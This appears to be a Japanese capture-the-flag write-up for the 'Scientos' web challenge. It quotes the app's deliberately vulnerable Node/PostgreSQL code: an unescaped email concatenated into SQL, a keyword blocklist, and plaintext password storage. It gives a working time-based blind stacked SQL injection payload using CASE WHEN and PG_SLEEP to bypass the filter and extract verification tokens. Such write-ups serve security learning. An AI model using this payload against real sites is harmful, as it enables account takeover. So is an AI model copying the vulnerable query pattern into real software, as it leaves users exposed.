🌐 [English](README.md) | [Français](README.fr.md) | [日本語](README.ja.md)

# Web - Scientos

## TL;DR

`ScientosNet` は科学者向けの偽のソーシャルネットワークである。フラグはホームページに、
メールアドレスが `@scientos-admin.net` で終わり、かつ **検証済み(verified)** の
アカウントに対してのみ表示される。アカウント検証はメールで送られるトークン(UUID)に
基づいているが、そのトークンを取得するSQLクエリはメールアドレスを **エスケープせずに**
連結している。

`CASE WHEN ... THEN PG_SLEEP(1) ELSE PG_SLEEP(0) END` というペイロードでインジェクション
対策のブラックリストを迂回することで、**時間ベースのブラインドSQLインジェクション
(スタックドクエリ)** を用いて検証用トークンを一文字ずつ抜き出し、任意の
`@scientos-admin.net` アカウントを有効化し、ログインしてフラグを取得する。

## アーキテクチャ

このチャレンジは4つのサービスから構成される(`docker-compose.yml`):

- **web** (Express / EJS、ポート3002): メインサイト。登録 / ログイン / フラグが表示される
  ホームページ
- **mailer** (ポート3001): `/mailer` からアクセスできる内部メールボックスを模擬する
- **proxy** (nginx): `web` と `mailer` を公開するリバースプロキシ
- **db**: PostgreSQL 16

この脆弱性に関連するのは `web` のソースコードのみである。

## 1. フラグの取得方法

`server.js`:

```js
app.get("/", (req, res) => {
    const user = req.user;
    const isAdmin = isAdministrator(user);
    if (isAdmin) {
        return res.render("index", {user, flag});
    }
    res.render("index", {user, flag: null});
})
```

`utils.js`:

```js
export function isAdministrator(user) {
    const email = extractEmail(user?.email || "");
    return email?.endsWith("@scientos-admin.net");
}
```

`req.user` はログイン時(`router.js`)に設定される `auth_token` というJWTクッキーから
生成される。つまり、フラグを見るには以下が必要となる:

1. `@scientos-admin.net` で終わるメールアドレスを持つアカウント
2. そのアカウントが **`verified = true`** であること(そうでなければ `/api/auth/login`
   が接続を拒否する)
3. セッションクッキーを取得するために、そのアカウントのパスワードを知っていること

`/api/auth/register` で **自分でこのようなアカウントを作成する** ことは何ら妨げられて
いない。唯一の障害は、サーバー側に保存された秘密のトークンを必要とするメール検証の
ステップである。

## 2. 脆弱性: `getToken` 内のSQLインジェクション

`db.js`:

```js
async function getToken(email) {
    const res = await readonlyPool.query(`SELECT id
                                          FROM users
                                          WHERE email = '${email}'`);
    ...
    const res2 = await readonlyPool.query(`SELECT value
                                           FROM tokens
                                           WHERE userId = '${userId}'
                                             AND expirationDate > NOW()`);
    return res2.rows[0]?.value;
}
```

`email` はバインドパラメータを使わず、文字列連結によって **そのまま** クエリに
注入されている。`getToken` は `GET /api/auth/validate` から呼び出される:

```js
router.get("/validate", async (req, res) => {
    const {email, token} = req.query;
    if (!req.query || !token || !isClearString(email) || !isClearString(token)) {
        return res.redirect("/auth?status=Requête invalide&color=red");
    }
    const actualToken = await getToken(email);
    ...
});
```

`/api/auth/validate` の `email` パラメータを介した、典型的なSQLインジェクションである。

### 技術的な詳細: なぜスタックドクエリ(`; ... --`)が機能するのか

`pool.query("SELECT ... '${email}'")` は **パラメータ配列なしで** 呼び出されている。
そのため `pg` ドライバはPostgreSQLの *シンプルクエリプロトコル* を使用するが、これは
1つのクエリ内で `;` 区切りの複数の文を許容する。したがって、元のクエリを「閉じて」、
任意のクエリをスタックすることができる:

```sql
SELECT id FROM users WHERE email = 'inexistant'; <我々のクエリ> --'
```

## 3. `isClearString` フィルタの迂回

`utils.js`:

```js
const blocklistRegex = /\b(?:union|and|or)\b|\||&|\/|#/;

export function isClearString(input) {
    if (typeof input === "string") {
        return !blocklistRegex.test(input.toLowerCase());
    }
    return false;
}
```

このブラックリストは(単語境界での)`union`、`and`、`or` という単語、および
`|`、`&`、`/`、`#` をブロックする。これは、すべての「典型的な」インジェクション
(`' OR 1=1 --`、`UNION SELECT ...`、`#` や `/* */` によるコメントなど)を
ブロックするには十分である。

**しかし**、`AND`/`OR`/`UNION` を一切使わずにブール条件を書く方法がある。それが
`CASE WHEN ... THEN ... ELSE ... END` であり、これらのキーワードは一切
フィルタされていない:

```sql
SELECT CASE WHEN (<条件>) THEN PG_SLEEP(1) ELSE PG_SLEEP(0) END
```

クエリ末尾のコメントには、ブラックリストに含まれていない `--`(ダブルハイフン)を
`#` や `/* */` の代わりに用いる。

## 4. トークンのブラインド抽出(時間ベースブラインドSQLi)

検証用トークンはUUID v4(36文字: `xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`、
アルファベット `0-9a-f-`)である。応答時間を測定することで、これを一文字ずつ
取得する:

```sql
inexistant';
SELECT CASE WHEN
    (SUBSTRING(
        (SELECT value FROM tokens WHERE userId = (SELECT id FROM users WHERE email='<TARGET_EMAIL>') LIMIT 1),
        <position>, 1
    ) = '<tested_character>')
    THEN PG_SLEEP(1)
    ELSE PG_SLEEP(0)
END --
```

各位置(1〜36)、および `0123456789abcdef-` の各候補文字について、このペイロードを
`GET /api/auth/validate?email=<payload>&token=test` 経由で送信し、応答にかかった
時間を計測する:

- 約0.8秒を超えれば条件は真であり、それが正しい文字である;
- そうでなければ次の候補文字に進む。

最悪でも 36 × 17 回のリクエストで、**パスワードもメールボックスへのアクセスも知らずに**、
任意のアカウント(メールアドレス指定)の検証用トークン全体が取得できる。

## 5. アカウントの有効化とログイン

トークンを取得した後の手順:

1. `xxxx@scientos-admin.net` というメールアドレスでアカウントを **登録** する
   (`POST /api/auth/register`)。
2. 上記のインジェクションでそのアカウントの検証用トークンを **抽出** する。
3. アカウントを **検証** する: `GET /api/auth/validate?email=<email>&token=<抽出したトークン>`
   を実行すると、データベース上で `verified = true` になる。
4. **ログイン**: `email` と `password` を指定して `POST /api/auth/login` を実行する。

### パスワードに関する罠

`auth-router.js`(ログイン処理):

```js
const passwordBuffer = Buffer.from(password, "hex");
const realPasswordBuffer = Buffer.from(userData.password, "hex");
if (passwordBuffer.length === realPasswordBuffer.length && timingSafeEqual(passwordBuffer, realPasswordBuffer)) {
```

(スクリプトの初期バージョンのコメントが示唆していたように)パスワードはサーバー側で
ハッシュ化されており、SHA-256を送信する必要があると考えるかもしれない。**それは誤りである**:
`createUser`(`db.js`)はパスワードを一切ハッシュ化せず、**そのまま** 保存している:

```js
async function createUser(email, username, password) {
    await createUserWithId(availableUserId++, email, username, password);
}
```

両辺の `Buffer.from(x, "hex")` は、2つの16進数文字列を定数時間で比較する
(`timingSafeEqual`)ためだけのものであり、ハッシュを検証するものでは **ない**。
したがって、登録時にそれ自体が有効な16進数となるパスワード(例: `aabbccdd`)を選び、
ログイン時に **全く同じ文字列** を送り返せばよい。SHA-256(64文字の16進数 = 32バイト)を
送信すると、デコード後の長さ(32バイト)が保存されているパスワードの長さ(`aabbccdd` の
場合4バイト)と一致しないため、`timingSafeEqual` に到達する前に
`passwordBuffer.length === realPasswordBuffer.length` の比較で失敗する。

5. すると、サーバーは `auth_token` クッキー(HS256で署名されたJWT)を設定し、
   `req.user` が埋まり、`isAdministrator` が `true` を返し、`GET /` でフラグが
   表示される。
